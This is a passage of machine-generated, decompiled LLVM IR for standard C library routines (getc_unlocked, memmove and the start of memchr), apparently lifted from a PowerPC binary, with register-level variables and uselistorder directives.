  uselistorder i1* %cr7_lt.global-to-local, { 0, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 2, 3, 4 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 1, 3, 2, 4, 5 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 45, { 2, 0, 1, 3 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3, 4 }
  uselistorder i8 48, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder %1 (i32, i32, i32)* @__asm_cror, { 1, 0 }
  uselistorder i32 -2147483648, { 12, 0, 1, 15, 14, 2, 4, 3, 16, 6, 5, 17, 8, 7, 18, 9, 19, 13, 10, 11 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10019f08.481 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_10010cb4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10010c14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010bc4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10010bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10010b8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010b60, { 1, 0 }
  uselistorder label %dec_label_pc_10010b4c, { 1, 0 }
  uselistorder label %dec_label_pc_10010b30, { 1, 0 }
  uselistorder label %dec_label_pc_10010b08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010ae8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10010ac4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10010aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10010a18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100109b4, { 1, 0 }
  uselistorder label %dec_label_pc_10010974, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10010938, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001090c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100108ec, { 1, 0 }
  uselistorder label %dec_label_pc_10010878, { 1, 0 }
  uselistorder label %dec_label_pc_10010768, { 1, 0 }
  uselistorder label %dec_label_pc_100106c0, { 1, 0 }
  uselistorder label %dec_label_pc_10010694, { 1, 0 }
  uselistorder label %dec_label_pc_10010688, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10010d08 = load i32, i32* @lr, align 4
  store i32 %v0_10010d08, i32* %r0.global-to-local, align 4
  %v0_10010d10 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10010d1c = add i32 %tmp, 16
  %v3_10010d1c = inttoptr i32 %v2_10010d1c to i32*
  %v4_10010d1c = load i32, i32* %v3_10010d1c, align 4
  store i32 %v4_10010d1c, i32* %r9.global-to-local, align 4
  %v2_10010d20 = add i32 %tmp, 24
  %v3_10010d20 = inttoptr i32 %v2_10010d20 to i32*
  %v4_10010d20 = load i32, i32* %v3_10010d20, align 4
  store i32 %v4_10010d20, i32* %r0.global-to-local, align 4
  %v2_10010d24 = icmp ult i32 %v4_10010d1c, %v4_10010d20
  br i1 %v2_10010d24, label %dec_label_pc_10010d8c, label %dec_label_pc_10010d2c

dec_label_pc_10010d2c:                            ; preds = %entry
  %v3_10010d2c = load i16, i16* %arg1, align 2
  %v4_10010d2c = zext i16 %v3_10010d2c to i32
  %v1_10010d30 = and i32 %v4_10010d2c, 131
  store i32 %v1_10010d30, i32* %r0.global-to-local, align 4
  %v2_10010d34 = icmp ugt i32 %v1_10010d30, 128
  br i1 %v2_10010d34, label %dec_label_pc_10010d4c, label %dec_label_pc_10010d3c

dec_label_pc_10010d3c:                            ; preds = %dec_label_pc_10010d2c
  store i32 268504388, i32* @lr, align 4
  %v3_10010d40 = call i32 @__stdio_trans2r_o(i16* inttoptr (i32 128 to i16*), i32 %v4_10010d1c)
  store i32 %v3_10010d40, i32* %r3.global-to-local, align 4
  %v3_10010d44 = icmp eq i32 %v3_10010d40, 0
  br i1 %v3_10010d44, label %dec_label_pc_10010d3c.dec_label_pc_10010d4c_crit_edge, label %dec_label_pc_10010e28

dec_label_pc_10010d3c.dec_label_pc_10010d4c_crit_edge: ; preds = %dec_label_pc_10010d3c
  %v0_10010d4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010d4c

dec_label_pc_10010d4c:                            ; preds = %dec_label_pc_10010d3c.dec_label_pc_10010d4c_crit_edge, %dec_label_pc_10010d2c
  %v2_10010dac = phi i32 [ %v0_10010d4c.pre, %dec_label_pc_10010d3c.dec_label_pc_10010d4c_crit_edge ], [ %tmp, %dec_label_pc_10010d2c ]
  %v1_10010d4c = inttoptr i32 %v2_10010dac to i16*
  %v2_10010d4c = load i16, i16* %v1_10010d4c, align 2
  %v3_10010d4c = zext i16 %v2_10010d4c to i32
  %v1_10010d50 = and i32 %v3_10010d4c, 2
  store i32 %v1_10010d50, i32* %r0.global-to-local, align 4
  %v3_10010d50 = icmp eq i32 %v1_10010d50, 0
  br i1 %v3_10010d50, label %dec_label_pc_10010d7c, label %dec_label_pc_10010d58

dec_label_pc_10010d58:                            ; preds = %dec_label_pc_10010d4c
  %v1_10010d58 = call i32 @__asm_rlwinm(i32 %v3_10010d4c, i32 2, i32 29, i32 29)
  %v1_10010d5c = load i32, i32* @r31, align 4
  %v2_10010d5c = add i32 %v1_10010d5c, %v1_10010d58
  store i32 %v2_10010d5c, i32* %r9.global-to-local, align 4
  %v1_10010d60 = add i32 %v2_10010d5c, 39
  %v2_10010d60 = inttoptr i32 %v1_10010d60 to i8*
  %v3_10010d60 = load i8, i8* %v2_10010d60, align 1
  %v4_10010d60 = zext i8 %v3_10010d60 to i32
  store i32 %v4_10010d60, i32* %r0.global-to-local, align 4
  %v1_10010d64 = add nsw i32 %v3_10010d4c, -1
  store i32 %v1_10010d64, i32* %r9.global-to-local, align 4
  %v1_10010d68 = trunc i32 %v1_10010d64 to i16
  %v3_10010d68 = inttoptr i32 %v1_10010d5c to i16*
  store i16 %v1_10010d68, i16* %v3_10010d68, align 2
  %v0_10010d6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10010d6c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10010d74 = load i32, i32* @r31, align 4
  %v2_10010d74 = add i32 %v1_10010d74, 40
  %v3_10010d74 = inttoptr i32 %v2_10010d74 to i32*
  store i32 0, i32* %v3_10010d74, align 4
  br label %dec_label_pc_10010e2c

dec_label_pc_10010d7c:                            ; preds = %dec_label_pc_10010d4c
  %v1_10010d7c = add i32 %v2_10010dac, 16
  %v2_10010d7c = inttoptr i32 %v1_10010d7c to i32*
  %v3_10010d7c = load i32, i32* %v2_10010d7c, align 4
  store i32 %v3_10010d7c, i32* %r9.global-to-local, align 4
  %v1_10010d80 = add i32 %v2_10010dac, 20
  %v2_10010d80 = inttoptr i32 %v1_10010d80 to i32*
  %v3_10010d80 = load i32, i32* %v2_10010d80, align 4
  store i32 %v3_10010d80, i32* %r0.global-to-local, align 4
  %v4_10010d84 = icmp eq i32 %v3_10010d80, %v3_10010d7c
  br i1 %v4_10010d84, label %dec_label_pc_10010d98, label %dec_label_pc_10010d8c

dec_label_pc_10010d8c:                            ; preds = %dec_label_pc_10010d7c, %entry
  %v1_10010e007 = phi i32 [ %v2_10010dac, %dec_label_pc_10010d7c ], [ %tmp, %entry ]
  %v0_10010d8c = phi i32 [ %v3_10010d7c, %dec_label_pc_10010d7c ], [ %v4_10010d1c, %entry ]
  %v1_10010d8c = inttoptr i32 %v0_10010d8c to i8*
  %v2_10010d8c = load i8, i8* %v1_10010d8c, align 1
  %v3_10010d8c = zext i8 %v2_10010d8c to i32
  store i32 %v3_10010d8c, i32* %r3.global-to-local, align 4
  %v1_10010d90 = add i32 %v0_10010d8c, 1
  store i32 %v1_10010d90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010e00

dec_label_pc_10010d98:                            ; preds = %dec_label_pc_10010d7c
  %v1_10010d98 = add i32 %v2_10010dac, 4
  %v2_10010d98 = inttoptr i32 %v1_10010d98 to i32*
  %v3_10010d98 = load i32, i32* %v2_10010d98, align 4
  store i32 %v3_10010d98, i32* %r0.global-to-local, align 4
  %v3_10010d9c = icmp eq i32 %v3_10010d98, -2
  br i1 %v3_10010d9c, label %dec_label_pc_10010da4, label %dec_label_pc_10010db4

dec_label_pc_10010da4:                            ; preds = %dec_label_pc_10010d98
  %v1_10010da4 = or i32 %v3_10010d4c, 4
  store i32 %v1_10010da4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10010dac = trunc i32 %v1_10010da4 to i16
  store i16 %v1_10010dac, i16* %v1_10010d4c, align 2
  br label %dec_label_pc_10010e2c

dec_label_pc_10010db4:                            ; preds = %dec_label_pc_10010d98
  %v1_10010db4 = and i32 %v3_10010d4c, 768
  store i32 %v1_10010db4, i32* %r0.global-to-local, align 4
  %v3_10010db4 = icmp eq i32 %v1_10010db4, 0
  br i1 %v3_10010db4, label %dec_label_pc_10010dc8, label %dec_label_pc_10010dbc

dec_label_pc_10010dbc:                            ; preds = %dec_label_pc_10010db4
  store i32 ptrtoint (i32** @global_var_1002ef98.233 to i32), i32* %r3.global-to-local, align 4
  store i32 268504520, i32* @lr, align 4
  %v4_10010dc4 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002ef98.233 to i16*), i32 %v3_10010d7c)
  store i32 %v4_10010dc4, i32* %r3.global-to-local, align 4
  %v0_10010dc8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010dc8

dec_label_pc_10010dc8:                            ; preds = %dec_label_pc_10010db4, %dec_label_pc_10010dbc
  %v0_10010e08 = phi i32 [ %v2_10010dac, %dec_label_pc_10010db4 ], [ %v0_10010dc8.pre, %dec_label_pc_10010dbc ]
  %v1_10010dc8 = add i32 %v0_10010e08, 8
  %v2_10010dc8 = inttoptr i32 %v1_10010dc8 to i32*
  %v3_10010dc8 = load i32, i32* %v2_10010dc8, align 4
  store i32 %v3_10010dc8, i32* %r9.global-to-local, align 4
  %v1_10010dcc = add i32 %v0_10010e08, 12
  %v2_10010dcc = inttoptr i32 %v1_10010dcc to i32*
  %v3_10010dcc = load i32, i32* %v2_10010dcc, align 4
  store i32 %v3_10010dcc, i32* %r0.global-to-local, align 4
  %v4_10010dd0 = icmp eq i32 %v3_10010dcc, %v3_10010dc8
  br i1 %v4_10010dd0, label %dec_label_pc_10010e08, label %dec_label_pc_10010dd8

dec_label_pc_10010dd8:                            ; preds = %dec_label_pc_10010dc8
  %v2_10010dd8 = add i32 %v0_10010e08, 24
  %v3_10010dd8 = inttoptr i32 %v2_10010dd8 to i32*
  store i32 %v3_10010dc8, i32* %v3_10010dd8, align 4
  %v0_10010ddc = load i32, i32* @r31, align 4
  store i32 %v0_10010ddc, i32* %r3.global-to-local, align 4
  store i32 268504548, i32* @lr, align 4
  %v3_10010de0 = call i32 @__stdio_rfill(i32 %v0_10010ddc, i32 %v3_10010dc8)
  store i32 %v3_10010de0, i32* %r3.global-to-local, align 4
  %v3_10010de4 = icmp eq i32 %v3_10010de0, 0
  br i1 %v3_10010de4, label %dec_label_pc_10010e28, label %dec_label_pc_10010dec

dec_label_pc_10010dec:                            ; preds = %dec_label_pc_10010dd8
  %v0_10010dec = load i32, i32* @r31, align 4
  %v1_10010dec = add i32 %v0_10010dec, 20
  %v2_10010dec = inttoptr i32 %v1_10010dec to i32*
  %v3_10010dec = load i32, i32* %v2_10010dec, align 4
  store i32 %v3_10010dec, i32* %r0.global-to-local, align 4
  %v1_10010df0 = add i32 %v0_10010dec, 16
  %v2_10010df0 = inttoptr i32 %v1_10010df0 to i32*
  %v3_10010df0 = load i32, i32* %v2_10010df0, align 4
  store i32 %v3_10010df0, i32* %r9.global-to-local, align 4
  %v2_10010df4 = add i32 %v0_10010dec, 24
  %v3_10010df4 = inttoptr i32 %v2_10010df4 to i32*
  store i32 %v3_10010dec, i32* %v3_10010df4, align 4
  %v0_10010df8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010df8 = add i32 %v0_10010df8, 1
  store i32 %v1_10010df8, i32* %r0.global-to-local, align 4
  %v1_10010dfc = inttoptr i32 %v0_10010df8 to i8*
  %v2_10010dfc = load i8, i8* %v1_10010dfc, align 1
  %v3_10010dfc = zext i8 %v2_10010dfc to i32
  store i32 %v3_10010dfc, i32* %r3.global-to-local, align 4
  %v1_10010e00.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10010e00

dec_label_pc_10010e00:                            ; preds = %dec_label_pc_10010d8c, %dec_label_pc_10010dec
  %v1_10010e00 = phi i32 [ %v1_10010e007, %dec_label_pc_10010d8c ], [ %v1_10010e00.pre, %dec_label_pc_10010dec ]
  %v0_10010e00 = phi i32 [ %v1_10010d90, %dec_label_pc_10010d8c ], [ %v1_10010df8, %dec_label_pc_10010dec ]
  %v2_10010e00 = add i32 %v1_10010e00, 16
  %v3_10010e00 = inttoptr i32 %v2_10010e00 to i32*
  store i32 %v0_10010e00, i32* %v3_10010e00, align 4
  br label %dec_label_pc_10010e2c

dec_label_pc_10010e08:                            ; preds = %dec_label_pc_10010dc8
  %v1_10010e08 = inttoptr i32 %v0_10010e08 to i16*
  store i32 %v0_10010e08, i32* %r3.global-to-local, align 4
  %v2_10010e0c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268504600, i32* @lr, align 4
  %v5_10010e14 = call i32 @__stdio_READ(i16* %v1_10010e08, i32 %v2_10010e0c, i32 1)
  store i32 %v5_10010e14, i32* %r3.global-to-local, align 4
  %v3_10010e18 = icmp eq i32 %v5_10010e14, 0
  br i1 %v3_10010e18, label %dec_label_pc_10010e28, label %dec_label_pc_10010e20

dec_label_pc_10010e20:                            ; preds = %dec_label_pc_10010e08
  %v3_10010e20 = load i8, i8* %stack_var_-24, align 1
  %v4_10010e20 = sext i8 %v3_10010e20 to i32
  store i32 %v4_10010e20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010e2c

dec_label_pc_10010e28:                            ; preds = %dec_label_pc_10010d3c, %dec_label_pc_10010e08, %dec_label_pc_10010dd8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010e2c

dec_label_pc_10010e2c:                            ; preds = %dec_label_pc_10010e20, %dec_label_pc_10010e00, %dec_label_pc_10010da4, %dec_label_pc_10010d58, %dec_label_pc_10010e28
  store i32 %v0_10010d08, i32* %r0.global-to-local, align 4
  store i32 %v0_10010d10, i32* @r31, align 4
  %v0_10010e3c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010e3c

; uselistorder directives
  uselistorder i32 %v0_10010e08, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10010d8c, { 1, 0 }
  uselistorder i32 %v3_10010d7c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10010d5c, { 1, 0 }
  uselistorder i32 %v3_10010d4c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10010dac, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 3, 4, 1, 5, 6, 7, 8, 2, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_1002ef98.233 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002ec10.232, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10010e2c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10010e28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010e00, { 1, 0 }
  uselistorder label %dec_label_pc_10010dc8, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_10010e40 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* @r8, align 4
  %v0_10010e48 = load i32, i32* @r5, align 4
  store i32 %v0_10010e48, i32* @r11, align 4
  br i1 %v2_10010e40, label %dec_label_pc_10010e54, label %dec_label_pc_10010e50

dec_label_pc_10010e50:                            ; preds = %entry
  %v0_10010e50 = call i32 @memcpy()
  store i32 %v0_10010e50, i32* @r3, align 4
  %v0_10010e54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10010e54

dec_label_pc_10010e54:                            ; preds = %entry, %dec_label_pc_10010e50
  %v0_10010e54 = phi i32 [ %v0_10010e48, %entry ], [ %v0_10010e54.pre, %dec_label_pc_10010e50 ]
  %v1_10010e54 = call i32 @__asm_rlwinm.(i32 %v0_10010e54, i32 29, i32 3, i32 31)
  store i32 %v1_10010e54, i32* %r9.global-to-local, align 4
  %v4_10010e54 = icmp eq i32 %v1_10010e54, 0
  %v1_10010e58 = load i32, i32* @r5, align 4
  %v2_10010e58 = add i32 %v1_10010e58, %arg2
  store i32 %v2_10010e58, i32* %r4.global-to-local, align 4
  %v0_10010e5c = load i32, i32* @r3, align 4
  %v2_10010e5c = add i32 %v0_10010e5c, %v1_10010e58
  store i32 %v2_10010e5c, i32* @r10, align 4
  br i1 %v4_10010e54, label %dec_label_pc_10010e84, label %dec_label_pc_10010e64

dec_label_pc_10010e64:                            ; preds = %dec_label_pc_10010e54
  %v1_10010e64 = urem i32 %v2_10010e5c, 4
  %v3_10010e64 = icmp eq i32 %v1_10010e64, 0
  br i1 %v3_10010e64, label %dec_label_pc_10010e6c, label %dec_label_pc_10010eb8

dec_label_pc_10010e6c:                            ; preds = %dec_label_pc_10010ed0.dec_label_pc_10010e6c_crit_edge, %dec_label_pc_10010e64
  %v1_10010e78.pre = phi i32 [ %v1_10010e78.pre.pre, %dec_label_pc_10010ed0.dec_label_pc_10010e6c_crit_edge ], [ %v2_10010e5c, %dec_label_pc_10010e64 ]
  %v0_10010e6c = phi i32 [ %v1_10010ed0, %dec_label_pc_10010ed0.dec_label_pc_10010e6c_crit_edge ], [ %v1_10010e54, %dec_label_pc_10010e64 ]
  store i32 %v0_10010e6c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010e70

dec_label_pc_10010e70:                            ; preds = %dec_label_pc_10010e70, %dec_label_pc_10010e6c
  %v1_10010e78 = phi i32 [ %v2_10010e7c, %dec_label_pc_10010e70 ], [ %v1_10010e78.pre, %dec_label_pc_10010e6c ]
  %v0_10010e70 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010e70 = add i32 %v0_10010e70, -4
  %v2_10010e70 = inttoptr i32 %v1_10010e70 to i32*
  %v3_10010e70 = load i32, i32* %v2_10010e70, align 4
  %v1_10010e74 = add i32 %v0_10010e70, -8
  %v2_10010e74 = inttoptr i32 %v1_10010e74 to i32*
  %v3_10010e74 = load i32, i32* %v2_10010e74, align 4
  store i32 %v3_10010e74, i32* %r9.global-to-local, align 4
  store i32 %v1_10010e74, i32* %r4.global-to-local, align 4
  %v2_10010e78 = add i32 %v1_10010e78, -4
  %v3_10010e78 = inttoptr i32 %v2_10010e78 to i32*
  store i32 %v3_10010e70, i32* %v3_10010e78, align 4
  %v0_10010e7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10010e7c = load i32, i32* @r10, align 4
  %v2_10010e7c = add i32 %v1_10010e7c, -8
  %v3_10010e7c = inttoptr i32 %v2_10010e7c to i32*
  store i32 %v0_10010e7c, i32* %v3_10010e7c, align 4
  store i32 %v2_10010e7c, i32* @r10, align 4
  %v0_10010e80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010e80 = add i32 %v0_10010e80, -1
  store i32 %v1_10010e80, i32* %ctr.global-to-local, align 4
  %v2_10010e80 = icmp eq i32 %v1_10010e80, 0
  br i1 %v2_10010e80, label %dec_label_pc_10010e84, label %dec_label_pc_10010e70

dec_label_pc_10010e84:                            ; preds = %dec_label_pc_10010e70, %dec_label_pc_10010ed0, %dec_label_pc_10010e54
  %v0_10010e84 = load i32, i32* @r11, align 4
  %v1_10010e84 = urem i32 %v0_10010e84, 8
  store i32 %v1_10010e84, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10010e84, 4
  br i1 %tmp, label %dec_label_pc_10010e9c, label %dec_label_pc_10010e90

dec_label_pc_10010e90:                            ; preds = %dec_label_pc_10010e84
  %v0_10010e90 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010e90 = add i32 %v0_10010e90, -4
  %v2_10010e90 = inttoptr i32 %v1_10010e90 to i32*
  %v3_10010e90 = load i32, i32* %v2_10010e90, align 4
  store i32 %v1_10010e90, i32* %r4.global-to-local, align 4
  %v1_10010e94 = add nsw i32 %v1_10010e84, -4
  store i32 %v1_10010e94, i32* %r5.global-to-local, align 4
  %v1_10010e98 = load i32, i32* @r10, align 4
  %v2_10010e98 = add i32 %v1_10010e98, -4
  %v3_10010e98 = inttoptr i32 %v2_10010e98 to i32*
  store i32 %v3_10010e90, i32* %v3_10010e98, align 4
  store i32 %v2_10010e98, i32* @r10, align 4
  %v0_10010e9c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010e9c

dec_label_pc_10010e9c:                            ; preds = %dec_label_pc_10010e84, %dec_label_pc_10010e90
  %v0_10010ea4 = phi i32 [ %v1_10010e84, %dec_label_pc_10010e84 ], [ %v0_10010e9c.pre, %dec_label_pc_10010e90 ]
  %v3_10010e9c = icmp eq i32 %v0_10010ea4, 0
  br i1 %v3_10010e9c, label %dec_label_pc_10010edc, label %dec_label_pc_10010ea4

dec_label_pc_10010ea4:                            ; preds = %dec_label_pc_10010e9c
  store i32 %v0_10010ea4, i32* %ctr.global-to-local, align 4
  %v2_10010eac.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10010ea8

dec_label_pc_10010ea8:                            ; preds = %dec_label_pc_10010ea8, %dec_label_pc_10010ea4
  %v2_10010eac = phi i32 [ %v3_10010eac, %dec_label_pc_10010ea8 ], [ %v2_10010eac.pre, %dec_label_pc_10010ea4 ]
  %v0_10010ea8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10010ea8 = add i32 %v0_10010ea8, -1
  %v2_10010ea8 = inttoptr i32 %v1_10010ea8 to i8*
  %v3_10010ea8 = load i8, i8* %v2_10010ea8, align 1
  store i32 %v1_10010ea8, i32* %r4.global-to-local, align 4
  %v3_10010eac = add i32 %v2_10010eac, -1
  %v4_10010eac = inttoptr i32 %v3_10010eac to i8*
  store i8 %v3_10010ea8, i8* %v4_10010eac, align 1
  store i32 %v3_10010eac, i32* @r10, align 4
  %v0_10010eb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010eb0 = add i32 %v0_10010eb0, -1
  store i32 %v1_10010eb0, i32* %ctr.global-to-local, align 4
  %v2_10010eb0 = icmp eq i32 %v1_10010eb0, 0
  br i1 %v2_10010eb0, label %dec_label_pc_10010edc, label %dec_label_pc_10010ea8

dec_label_pc_10010eb8:                            ; preds = %dec_label_pc_10010e64
  %v1_10010eb8 = sub nsw i32 4, %v1_10010e64
  store i32 %v1_10010eb8, i32* %ctr.global-to-local, align 4
  %v2_10010ec0 = sub i32 %v1_10010e58, %v1_10010eb8
  store i32 %v2_10010ec0, i32* @r11, align 4
  %v1_10010ec49 = add i32 %v2_10010e58, -1
  %v2_10010ec410 = inttoptr i32 %v1_10010ec49 to i8*
  %v3_10010ec411 = load i8, i8* %v2_10010ec410, align 1
  store i32 %v1_10010ec49, i32* %r4.global-to-local, align 4
  %v3_10010ec813 = add i32 %v2_10010e5c, -1
  %v4_10010ec814 = inttoptr i32 %v3_10010ec813 to i8*
  store i8 %v3_10010ec411, i8* %v4_10010ec814, align 1
  store i32 %v3_10010ec813, i32* @r10, align 4
  %v0_10010ecc15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010ecc16 = add i32 %v0_10010ecc15, -1
  store i32 %v1_10010ecc16, i32* %ctr.global-to-local, align 4
  %v2_10010ecc17 = icmp eq i32 %v1_10010ecc16, 0
  br i1 %v2_10010ecc17, label %dec_label_pc_10010ed0, label %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge

dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge: ; preds = %dec_label_pc_10010eb8, %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge
  %v3_10010ec818 = phi i32 [ %v3_10010ec8, %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge ], [ %v3_10010ec813, %dec_label_pc_10010eb8 ]
  %v0_10010ec4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10010ec4 = add i32 %v0_10010ec4.pre, -1
  %v2_10010ec4 = inttoptr i32 %v1_10010ec4 to i8*
  %v3_10010ec4 = load i8, i8* %v2_10010ec4, align 1
  store i32 %v1_10010ec4, i32* %r4.global-to-local, align 4
  %v3_10010ec8 = add i32 %v3_10010ec818, -1
  %v4_10010ec8 = inttoptr i32 %v3_10010ec8 to i8*
  store i8 %v3_10010ec4, i8* %v4_10010ec8, align 1
  store i32 %v3_10010ec8, i32* @r10, align 4
  %v0_10010ecc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010ecc = add i32 %v0_10010ecc, -1
  store i32 %v1_10010ecc, i32* %ctr.global-to-local, align 4
  %v2_10010ecc = icmp eq i32 %v1_10010ecc, 0
  br i1 %v2_10010ecc, label %dec_label_pc_10010ed0, label %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge

dec_label_pc_10010ed0:                            ; preds = %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge, %dec_label_pc_10010eb8
  %v0_10010ed0 = load i32, i32* @r11, align 4
  %v1_10010ed0 = call i32 @__asm_rlwinm.(i32 %v0_10010ed0, i32 29, i32 3, i32 31)
  store i32 %v1_10010ed0, i32* %r9.global-to-local, align 4
  %v4_10010ed0 = icmp eq i32 %v1_10010ed0, 0
  br i1 %v4_10010ed0, label %dec_label_pc_10010e84, label %dec_label_pc_10010ed0.dec_label_pc_10010e6c_crit_edge

dec_label_pc_10010ed0.dec_label_pc_10010e6c_crit_edge: ; preds = %dec_label_pc_10010ed0
  %v1_10010e78.pre.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_10010e6c

dec_label_pc_10010edc:                            ; preds = %dec_label_pc_10010ea8, %dec_label_pc_10010e9c
  %v0_10010edc = load i32, i32* @r8, align 4
  ret i32 %v0_10010edc

; uselistorder directives
  uselistorder i32 %v1_10010ed0, { 1, 2, 0 }
  uselistorder i32 %v1_10010ecc, { 1, 0 }
  uselistorder i32 %v3_10010ec8, { 1, 2, 0 }
  uselistorder i32 %v1_10010eb0, { 1, 0 }
  uselistorder i32 %v3_10010eac, { 1, 2, 0 }
  uselistorder i32 %v1_10010e84, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10010e80, { 1, 0 }
  uselistorder i32 %v2_10010e7c, { 1, 2, 0 }
  uselistorder i32 %v1_10010e64, { 1, 0 }
  uselistorder i32 %v2_10010e5c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10010e58, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder label %dec_label_pc_10010ec4.dec_label_pc_10010ec4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10010e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10010e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010e54, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10010ee8 = urem i32 %arg1, 256
  store i32 %v1_10010ee8, i32* %r4.global-to-local, align 4
  %v0_10010f087 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_10010f0c13 = icmp eq i32 %arg2, 0
  br i1 %v2_10010f0c13, label %dec_label_pc_10010f14, label %dec_label_pc_10010f10

dec_label_pc_10010ef4:                            ; preds = %dec_label_pc_10010f10
  %v1_10010ef4 = inttoptr i32 %v0_10010ef4 to i8*
  %v2_10010ef4 = load i8, i8* %v1_10010ef4, align 1
  %v3_10010ef4 = zext i8 %v2_10010ef4 to i32
  %v0_10010ef8 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010ef8 = add i32 %v0_10010ef8, -1
